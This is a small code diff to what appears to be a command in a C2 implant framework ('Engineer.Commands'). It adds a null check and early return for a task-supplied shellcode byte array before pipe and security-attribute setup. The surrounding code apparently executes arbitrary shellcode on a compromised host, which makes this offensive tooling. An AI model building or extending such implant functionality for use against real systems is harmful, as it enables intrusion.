@@ -28,13 +28,13 @@ namespace Engineer.Commands
                 pa.nLength = Marshal.SizeOf(pa);
                 var ta = new WinBase._SECURITY_ATTRIBUTES();
                 ta.nLength = Marshal.SizeOf(ta);
-                
-                if (task.File.Length < 1)
+                byte[]? shellcode = task.File;
+                if (shellcode == null || shellcode.Length < 1)
                 {
                     ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Error: No file provided", task, EngTaskStatus.Failed,TaskResponseType.String);
+                    return;
                 }
-                //convert from base64 string to byte array
-                byte[] shellcode = task.File;
+                
 
                 WinBase._SECURITY_ATTRIBUTES saAttr = new WinBase._SECURITY_ATTRIBUTES();
                 // Set the bInheritHandle flag so pipe handles are inherited. 
